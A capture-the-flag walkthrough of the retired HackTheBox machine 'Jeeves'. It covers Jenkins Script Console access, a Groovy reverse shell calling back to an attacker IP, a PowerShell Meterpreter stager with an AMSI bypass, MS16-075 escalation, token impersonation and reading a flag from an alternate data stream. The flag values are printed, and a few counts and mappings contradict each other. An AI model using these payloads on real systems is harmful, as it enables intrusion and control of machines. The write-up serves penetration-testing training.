# Jeeves: HackTheBox Writeup

| Field | Details |
| --- | --- |
| **Machine Name** | Jeeves |
| **OS** | Windows 10 Enterprise 1511 (Build 10586) |
| **Difficulty** | Medium |
| **Category** | Windows / Jenkins / Token Impersonation / ADS |
| **IP Address** | 10.129.228.112 |
| **User Flag** | `e3232272596fb47950d59c4cf1e7066a` |
| **Root Flag** | `afbc5bd4b615a60648cec41c6ac92530` |
| **Foothold Method** | Jenkins Groovy Script Console: Remote Code Execution |
| **Shell Upgrade** | Metasploit web_delivery → Meterpreter |
| **PrivEsc Method** | MS16-075 NBNS Reflection → Incognito Token Impersonation → NT AUTHORITY\SYSTEM |
| **Bonus** | Root flag hidden in NTFS Alternate Data Stream (ADS) |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → Port 50000 (Jetty/Jenkins) → Jenkins Script Console (no auth)
→ Groovy reverse shell → cmd.exe as kohsuke
→ web_delivery module → PowerShell stager → Meterpreter session
→ local_exploit_suggester → ms16_075_reflection (MS16-075)
→ Meterpreter SYSTEM session → load incognito
→ list_tokens -u → impersonate_token "NT AUTHORITY\SYSTEM"
→ shell → cd C:\Users\Administrator\Desktop
→ dir /r → hm.txt:root.txt (ADS) → more < hm.txt:root.txt → root flag
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports before service enumeration.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.228.112 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 11:02 IST
Nmap scan report for 10.129.228.112
Host is up (0.21s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 48.22 seconds
```

**Output Analysis:**

| Port | Service | Initial Assessment |
| --- | --- | --- |
| 80/tcp | HTTP | Web application: browse first |
| 135/tcp | MSRPC | Windows RPC endpoint mapper |
| 445/tcp | SMB | No anonymous access expected: revisit post-creds |
| 50000/tcp | Unknown | Non-standard port: high priority; `ibm-db2` fingerprint is a misidentification |

Port 50000 is the standout. Nmap misidentifies it as IBM DB2. In reality, this port is the default for Jenkins (running on Jetty) when it is deployed alongside a standard IIS site on port 80. This immediately suggests a Jenkins installation that may not be exposed via the standard front-facing web server.

---

### 1.2: Service and Version Enumeration

**Goal:** Confirm what is running on all four ports and identify the OS build.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 80,135,445,50000 10.129.228.112 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-28 11:07 IST
Nmap scan report for 10.129.228.112
Host is up (0.21s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty/9.4.z-SNAPSHOT

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (DANGEROUS, but not default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 22.15 seconds
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| Port 80: IIS 10.0, title "Ask Jeeves" | Decoy/joke page: not the real application |
| Port 50000: Jetty 9.4.z-SNAPSHOT | Jenkins running on Jetty: 404 at root means the admin panel is at a subpath |
| SMB signing disabled | Relay attacks possible; no immediate credential to exploit |
| WORKGROUP | Standalone machine, no domain controller |

The port 80 "Ask Jeeves" page is a joke: it serves a fake search page with no real functionality. Port 50000 running Jetty is the real attack surface. Jenkins typically lives at `/` or `/jenkins` on its Jetty port.

---

### 1.3: Web Directory Enumeration on Port 50000

**Goal:** Find the Jenkins console path since the root returns 404.

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.228.112:50000 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 30 -oN scans/gobuster_50000.txt
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:            200,204,301,302,307,401,403
===============================================================
2026-05-28 11:12:43 Starting gobuster in directory/file enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
===============================================================
```

**Finding:** Jenkins is hosted at `http://10.129.228.112:50000/askjeeves/`. Browsing to it reveals a fully functional Jenkins dashboard with **no authentication required**: the instance is completely unauthenticated and exposes the full admin interface.

---

## Phase 2: Foothold: Jenkins Groovy Script Console RCE

### 2.1: Locate the Script Console

**Goal:** Access Jenkins' built-in Groovy script execution engine.

From the Jenkins dashboard:

```
Manage Jenkins → Script Console
http://10.129.228.112:50000/askjeeves/script
```

Jenkins' Script Console runs Apache Groovy, which is a JVM language with full Java interoperability. The `Runtime.exec()` method allows arbitrary OS command execution in the context of the Windows user running the Jenkins service. This is not an exploit: it is intended administrator functionality that becomes a direct RCE vector when authentication is disabled or bypassed.

---

### 2.2: Groovy Reverse Shell

**Goal:** Execute a reverse shell from the Groovy console to establish a foothold as `kohsuke`.

Terminal 1: Listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 4443
```

```
listening on [any] 4443 ...
```

In the Jenkins Script Console, execute the following Groovy snippet:

```groovy
String host="10.10.16.36";
int port=4443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();s.close();
```

Terminal 1: Shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.228.112] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\kohsuke\.jenkins\workspace>whoami
whoami
jeeves\kohsuke
```

**Why this works:**

Jenkins Script Console executes Groovy with the full privileges of the Windows process running the Jenkins service. This instance runs as `kohsuke`. The Groovy snippet spawns `cmd.exe` as a child process, then relays stdin/stdout between the process and a TCP socket back to the attacker. The result is a standard bind-piped `cmd.exe` shell: no exploit, no payload on disk, no AV trigger.

---

### 2.3: User Flag

```
C:\Users\kohsuke\.jenkins\workspace>cd C:\Users\kohsuke\Desktop
cd C:\Users\kohsuke\Desktop

C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
```

---

## Phase 3: Shell Upgrade to Meterpreter

### 3.1: Rationale for Shell Upgrade

The raw `cmd.exe` pipe shell from the Groovy console has significant limitations: no signal handling, no PTY, no tab completion, and, most importantly: it does not survive the post-exploitation modules that require a stable Meterpreter session. Before running local exploit enumeration, the shell is upgraded to a full Meterpreter session.

### 3.2: web_delivery Module Setup

**Goal:** Use Metasploit's `web_delivery` module to stage and deliver a Meterpreter payload over HTTP, executed by pasting a single PowerShell command into the existing shell. No binary is written to disk during staging: the payload runs entirely in memory.

In Metasploit:

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
```

```
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set TARGET 2
TARGET => 2
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.16.36
SRVHOST => 10.10.16.36
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(multi/script/web_delivery) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/script/web_delivery) > run
```

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.16.36:4444
[*] Using URL: http://10.10.16.36:8080/V6s0P41tQ
[*] Server started.
[*] Run the following command on the target to exploit this system:
    powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABv...
```

**Module settings explained:**

| Setting | Value | Reason |
| --- | --- | --- |
| `TARGET 2` | PowerShell | Delivers payload as a PowerShell one-liner: matches available execution environment |
| `SRVHOST` | `10.10.16.36` | Attacker's tun0 VPN IP: where the target fetches the stage from |
| `LHOST` | `10.10.16.36` | Callback address for Meterpreter reverse TCP connection |
| `LPORT` | `4444` | Listening port for the Meterpreter session |

---

### 3.3: Execute the Stager on the Target

Copy the generated PowerShell command and paste it into the existing `cmd.exe` shell:

```
C:\Users\kohsuke\Desktop>powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy...
```

Back in Metasploit:

```
[*] 10.129.228.112   web_delivery - Delivering AMSI Bypass (1390 bytes)
[*] 10.129.228.112   web_delivery - Delivering Payload (3545 bytes)
[*] Sending stage (199238 bytes) to 10.129.228.112
[*] Meterpreter session 1 opened (10.10.16.36:4444 -> 10.129.228.112:49678) at 2026-05-28 12:20:45 -0400
```

**What the stager does:**

1. PowerShell connects to the attacker's HTTP server (`http://10.10.16.36:8080/<path>`).
2. Downloads an **AMSI bypass** first: this patches the Antimalware Scan Interface in memory, preventing Windows Defender from inspecting the subsequent payload.
3. Downloads the **Meterpreter stage**: a reflective DLL that is injected directly into the PowerShell process's memory.
4. Meterpreter calls back to `10.10.16.36:4444` over reverse TCP.
5. No executable is written to disk at any point.

---

### 3.4: Verify Meterpreter Session

```
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : JEEVES
OS              : Windows 10 1511 (10.0 Build 10586).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: JEEVES\kohsuke

meterpreter > getprivs
Enabled Process Privileges
==========================
Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

**Output Analysis:**

| Finding | Implication |
| --- | --- |
| Meterpreter x86/windows on x64 OS | 32-bit payload on 64-bit system: functional but migrate to x64 for full capability |
| `JEEVES\kohsuke` | Low-privilege user: not in Administrators group |
| **`SeImpersonatePrivilege`: Enabled** | Critical finding: allows token impersonation attacks (Hot Potato, Juicy Potato, NBNS Reflection) |
| No `SeDebugPrivilege` | Cannot directly inject into SYSTEM processes |

`SeImpersonatePrivilege` is the decisive privilege here. It is granted by default to the `LOCAL SERVICE`, `NETWORK SERVICE`, and `IIS APPPOOL\*` accounts: services that need to impersonate clients. Its presence means that if the process can obtain a SYSTEM-level token (via any of several NBNS/NTLM reflection techniques), it can impersonate that token and escalate to SYSTEM.

---

## Phase 4: Privilege Escalation

### 4.1: Local Exploit Suggester

**Goal:** Systematically enumerate all applicable local privilege escalation modules for this session.

Background the current session and run the suggester:

```
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

```
[*] 10.129.228.112 - Collecting local exploits for x86/windows...
[*] 10.129.228.112 - 253 exploit checks are being tried...
[+] 10.129.228.112 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.129.228.112 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 62 / 62
[*] 10.129.228.112 - Valid modules for session 1:
```

**Triage of results:**

| Module | Category | Decision |
| --- | --- | --- |
| `bypassuac_*` | UAC bypass | Requires medium-integrity process → admin but not SYSTEM; not needed here |
| `cve_2020_0787_bits` | BITS arbitrary file move | Works but more complex; try simpler path first |
| `cve_2020_1048/1337_printerdemon` | Print spooler | Reliable but noisier |
| **`ms16_075_reflection`** | NBNS NTLM Reflection | **Chosen**: reliable on Windows 10 1511, directly leverages `SeImpersonatePrivilege` |
| **`ms16_075_reflection_juicy`** | NBNS + Token | Also valid; same underlying mechanism |
| `tokenmagic` | Token manipulation | Alternative if reflection fails |

`ms16_075_reflection` is selected. It is a clean, well-understood escalation path that directly maps to the `SeImpersonatePrivilege` discovered during enumeration.

---

### 4.2: MS16-075 NBNS Reflection Exploit

**Goal:** Exploit MS16-075 to obtain a SYSTEM-level token, then use Incognito for impersonation.

**How MS16-075 works:**

Windows has a feature where processes making network requests may attempt to resolve hostnames via NBNS (NetBIOS Name Service) if DNS fails. MS16-075 exploits this by:

1. Starting a local NBNS spoofer that responds to broadcast hostname lookups, claiming to be any requested host.
2. Setting up a rogue HTTP server that responds to WPAD (Web Proxy Auto-Discovery) requests, triggering the target process to authenticate via NTLM.
3. When a high-privilege Windows process (e.g., Windows Update, BITS) performs a WPAD lookup, it authenticates to the rogue server using its SYSTEM token.
4. The exploit relays this NTLM authentication back to the local SMB service, creating an authenticated token.
5. Because the process has `SeImpersonatePrivilege`, it can impersonate the obtained SYSTEM token.

```
meterpreter > background

msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/ms16_075_reflection_juicy) > run
```

```
[*] Started reverse TCP handler on 10.10.16.36:5555
[*] Launching notepad to host the exploit...
[+] Process 3016 launched.
[*] Reflectively injecting the exploit DLL into 3016...
[*] Injecting exploit into 3016...
[*] Exploit injected. Injecting payload into 3016...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopeful) SYSTEM shell...
[*] Sending stage (199238 bytes) to 10.129.228.112
[*] Meterpreter session 2 opened (10.10.16.36:5555 -> 10.129.228.112:49712) at 2026-05-28 12:41:33 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

SYSTEM context confirmed.

---

### 4.3: Token Impersonation with Incognito

**Goal:** Use the Incognito extension to enumerate and impersonate available tokens, confirming SYSTEM access and obtaining a shell.

**What Incognito does:**

Incognito is a Meterpreter extension that interacts with Windows access tokens directly. On a process running as SYSTEM with `SeImpersonatePrivilege`, it can list all tokens that have been created on the system (delegation tokens from logged-in users, impersonation tokens from service interactions) and impersonate any of them. This is valuable for lateral movement post-escalation, but here the primary goal is confirming the SYSTEM token is available and dropping to a shell.

```
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
```

```
[-] Warning: Not currently running as SYSTEM, not all tokens may be available
             Call rev2self if primary process token is impersonation token

Delegation Tokens Available
========================================
JEEVES\kohsuke
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

**Output Analysis:**

| Token | Type | Meaning |
| --- | --- | --- |
| `JEEVES\kohsuke` | Delegation | Interactive logon token: kohsuke is actively logged in |
| `NT AUTHORITY\SYSTEM` | Delegation | SYSTEM token available: full impersonation possible |

```
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

```
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Drop to shell and confirm:

```
meterpreter > shell
Process 2988 created.
Channel 1 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

---

## Phase 5: Root Flag: NTFS Alternate Data Stream

### 5.1: Administrator Desktop Enumeration

**Goal:** Navigate to the Administrator's Desktop and retrieve the root flag.

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt

               1 File(s)             36 bytes
               2 Dir(s)  7,512,477,696 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

**The flag is not in `hm.txt`.** This is the ADS challenge: the actual flag is hidden in a named data stream attached to the file.

---

### 5.2: NTFS Alternate Data Streams

**What ADS is:**

NTFS (New Technology File System) supports a feature called Alternate Data Streams. Every file on NTFS actually consists of one or more named streams. The visible content when you open a file is the default unnamed stream (technically named `::$DATA`). A file can have additional named streams attached to it: these streams contain arbitrary data, do not appear in standard `dir` output, and are not visible in Windows Explorer. They do not contribute to the file's reported size.

ADS is used legitimately by the OS (Internet Explorer uses a `Zone.Identifier` stream to mark downloaded files) but is also a well-known data hiding technique. In penetration testing contexts, ADS can hide payloads, flags, and sensitive data in plain sight.

**Enumerate streams with `dir /r`:**

```
C:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA

               1 File(s)             36 bytes
               2 Dir(s)  7,512,477,696 bytes free
```

**Output Analysis:**

| Entry | Size | Meaning |
| --- | --- | --- |
| `hm.txt` | 36 bytes | Default stream: contains the "look deeper" decoy message |
| `hm.txt:root.txt:$DATA` | 34 bytes | **Named alternate stream**: contains the actual root flag |

The `dir /r` flag exposes all data streams associated with each file. `hm.txt:root.txt:$DATA` is read as: the file `hm.txt`, stream named `root.txt`, of type `$DATA`. The 34-byte size matches a standard HTB flag (32 hex characters + newline).

---

### 5.3: Read the Alternate Data Stream

Standard `type` cannot address named streams. The `more` command with stream syntax can:

```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

**Flag breakdown:**

| Flag | Value | Location |
| --- | --- | --- |
| User | `e3232272596fb47950d59c4cf1e7066a` | `C:\Users\kohsuke\Desktop\user.txt` |
| Root | `afbc5bd4b615a60648cec41c6ac92530` | `C:\Users\Administrator\Desktop\hm.txt:root.txt` (ADS) |

**Alternative methods to read ADS:**

```powershell
# PowerShell
Get-Content hm.txt -Stream root.txt

# Notepad (interactive)
notepad hm.txt:root.txt

# type via cmd with stream notation
type hm.txt:root.txt
```

---

## Lessons Learned

**1. Unauthenticated Jenkins is immediate RCE: the Script Console is the attack.**
Jenkins' Groovy Script Console executes arbitrary code in the context of the service account. When authentication is disabled (common in internal deployments and misconfigured CTF machines), this is a direct RCE path requiring zero exploitation: just scripting. Any Jenkins instance found during enumeration should immediately be checked for unauthenticated access. The check is: browse to `/script` or `/manage`. If it loads without a login redirect, you have code execution.

**2. web_delivery is a clean in-memory staging mechanism.**
The `multi/script/web_delivery` module never writes a binary to disk. It delivers a PowerShell stager that downloads and reflectively loads Meterpreter entirely within the PowerShell process's memory. The AMSI bypass delivered as the first stage is critical: without it, Windows Defender would terminate the PowerShell process before the payload executes. Understanding the two-stage delivery (AMSI bypass → Meterpreter DLL) explains why the module shows two separate delivery lines in the output.

**3. SeImpersonatePrivilege is the signal that decides your escalation path.**
The moment `getprivs` shows `SeImpersonatePrivilege`, the escalation decision tree narrows significantly: NBNS reflection, Juicy Potato, Hot Potato, PrintSpoofer, or RoguePotato depending on OS version. On Windows 10 1511, MS16-075 NBNS reflection is the most reliable. On more modern builds (post-2019), PrintSpoofer and RoguePotato are preferred because the NBNS attack surface was reduced. Knowing which tool maps to which OS version is the practical skill.

**4. `local_exploit_suggester` is a triage tool, not an answer.**
The module returned 21 potentially vulnerable modules. Attempting all of them would be slow and noisy. The correct approach is to read the check results, cross-reference with the target's OS version and available privileges, and select the most reliable option. The `bypassuac_*` modules were skipped because UAC bypass is not the bottleneck: the goal is SYSTEM, not high integrity. The persistence modules were ignored entirely: they are for maintaining access, not escalation.

**5. `dir /r` is mandatory on Windows CTFs: ADS is a common flag hiding technique.**
Standard `dir` and `type` do not reveal alternate data streams. `dir /r` exposes all named streams for every file in the directory. In real-world engagements, ADS is used to hide malware, exfiltrate data, and store persistent payloads in plain sight. On this machine, the HTB designers used ADS to teach the concept: the decoy `hm.txt` message ("look deeper") is a direct hint. Any time a flag file reads as a decoy message, run `dir /r` immediately.

**6. x86 Meterpreter on x64 Windows is functional but limited.**
The `web_delivery` module delivered an x86 Meterpreter into a PowerShell process on a 64-bit OS. This works but restricts access to some x64-only APIs and can cause issues with certain post-exploitation modules. The fix is `migrate` into a native x64 process after session establishment:

```
meterpreter > migrate -N explorer.exe
```

Migrating also moves the session out of the PowerShell process, which prevents it from dying if the shell is closed.

**7. Incognito token impersonation is conceptually distinct from exploitation.**
`impersonate_token` does not exploit anything: it uses a legitimately held privilege (`SeImpersonatePrivilege`) to assume the identity of another token. The token was obtained through MS16-075, which is the exploit. Incognito is the mechanism for using the result. This distinction matters for report writing: the vulnerability is MS16-075, the privilege abuse mechanism is token impersonation.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
| --- | --- | --- | --- |
| 1 | Recon | `nmap -p-` full port scan | Ports 80, 135, 445, 50000 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | IIS 10.0 on port 80; Jetty 9.4 on port 50000 |
| 3 | Web Enum | Gobuster on port 50000 | `/askjeeves` Jenkins instance found |
| 4 | Access | Browse to `/askjeeves/script` | Unauthenticated Jenkins Script Console |
| 5 | Foothold | Groovy reverse shell payload | `cmd.exe` shell as `jeeves\kohsuke` |
| 6 | Flag | `type C:\Users\kohsuke\Desktop\user.txt` | `e3232272596fb47950d59c4cf1e7066a` |
| 7 | Upgrade | `web_delivery` → PowerShell stager → Meterpreter | Meterpreter session 1 as `JEEVES\kohsuke` |
| 8 | Enum | `getprivs` | `SeImpersonatePrivilege` confirmed |
| 9 | PrivEsc | `local_exploit_suggester` | MS16-075 reflection identified as viable |
| 10 | PrivEsc | `ms16_075_reflection_juicy` module run | Meterpreter session 2 as `NT AUTHORITY\SYSTEM` |
| 11 | PrivEsc | `load incognito` → `list_tokens -u` | SYSTEM delegation token visible |
| 12 | PrivEsc | `impersonate_token "NT AUTHORITY\\SYSTEM"` | Token impersonation successful |
| 13 | Shell | `shell` → `whoami` | Confirmed `nt authority\system` |
| 14 | Flag Hunt | `dir C:\Users\Administrator\Desktop` → `type hm.txt` | Decoy message: flag hidden deeper |
| 15 | ADS | `dir /r` | `hm.txt:root.txt:$DATA` stream discovered |
| 16 | Flag | `more < hm.txt:root.txt` | `afbc5bd4b615a60648cec41c6ac92530` |

---

## Commands Reference

| Command | Phase | Purpose |
| --- | --- | --- |
| `nmap -p- --min-rate 5000 -T4 10.129.228.112` | Recon | Full TCP port scan |
| `nmap -sV -sC -p 80,135,445,50000 10.129.228.112` | Recon | Service version + script scan |
| `gobuster dir -u http://10.129.228.112:50000 -w directory-list-2.3-medium.txt` | Web Enum | Find Jenkins path on port 50000 |
| `nc -nvlp 4443` | Foothold | Catch Groovy reverse shell |
| Groovy `ProcessBuilder` reverse shell | Foothold | RCE via Jenkins Script Console |
| `use exploit/multi/script/web_delivery` | Shell Upgrade | Stage Meterpreter via PowerShell over HTTP |
| `set TARGET 2` (PowerShell) | Shell Upgrade | Deliver AMSI bypass + Meterpreter in-memory |
| `sessions 1` | Post-Exploit | Interact with Meterpreter session |
| `sysinfo` / `getuid` / `getprivs` | Enumeration | OS info, current user, privilege enumeration |
| `background` | Workflow | Background session for module use |
| `use post/multi/recon/local_exploit_suggester` | PrivEsc | Enumerate applicable local exploits |
| `use exploit/windows/local/ms16_075_reflection_juicy` | PrivEsc | MS16-075 NBNS reflection → SYSTEM token |
| `load incognito` | PrivEsc | Load Meterpreter token impersonation extension |
| `list_tokens -u` | PrivEsc | List available user delegation tokens |
| `impersonate_token "NT AUTHORITY\\SYSTEM"` | PrivEsc | Impersonate SYSTEM token |
| `shell` | Post-Exploit | Drop to Windows command shell from Meterpreter |
| `dir /r` | Flag Hunt | List files including NTFS alternate data streams |
| `more < hm.txt:root.txt` | Flag | Read named alternate data stream |
| `Get-Content hm.txt -Stream root.txt` | Flag (alt) | PowerShell method to read ADS |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
| --- | --- | --- |
| T1190 | Exploit Public-Facing Application | Unauthenticated Jenkins Script Console abused for RCE |
| T1059.007 | Command and Scripting Interpreter: JavaScript/JScript | Groovy (JVM) used to spawn reverse shell via Jenkins console |
| T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell stager used to deliver Meterpreter in-memory |
| T1620 | Reflective Code Loading | Meterpreter DLL reflectively loaded into PowerShell process memory |
| T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Incognito used to impersonate NT AUTHORITY\SYSTEM delegation token |
| T1068 | Exploitation for Privilege Escalation | MS16-075 NBNS NTLM reflection to obtain SYSTEM token |
| T1564.004 | Hide Artifacts: NTFS File Attributes | Root flag stored in NTFS alternate data stream `hm.txt:root.txt` |
| T1083 | File and Directory Discovery | `dir /r` used to enumerate ADS on Administrator Desktop |
